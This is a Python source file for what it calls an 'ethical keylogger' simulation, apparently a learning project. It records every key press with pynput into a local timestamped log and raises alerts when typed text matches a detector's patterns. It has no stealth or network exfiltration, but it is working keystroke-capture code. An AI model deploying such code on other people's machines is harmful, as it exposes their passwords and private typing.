from pynput import keyboard
from keylogger.detector import PatternDetector
from keylogger.observer import PatternObserver
import datetime
import os

LOG_DIR = "logs"
LOG_FILE = os.path.join(LOG_DIR, "log.txt")
ALERT_FILE = os.path.join(LOG_DIR, "patterns_detected.txt")

if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

class KeyLogger:
    def __init__(self):
        self.pattern_detector = PatternDetector()
        self.observer = PatternObserver(ALERT_FILE)

    def write_log(self, key):
        time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        text = self._format_key(key)

        with open(LOG_FILE, "a") as f:
            f.write(f"[{time}] {text}\n")

        if self.pattern_detector.matches(text):
            self.observer.notify(f"[{time}] ALERTA - Patrón detectado: {text}")

    def _format_key(self, key):
        try:
            return key.char
        except AttributeError:
            return str(key)

    def on_press(self, key):
        self.write_log(key)

    def run(self):
        print("[Simulación] El keylogger ético se ha iniciado.")
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
    KeyLogger().run()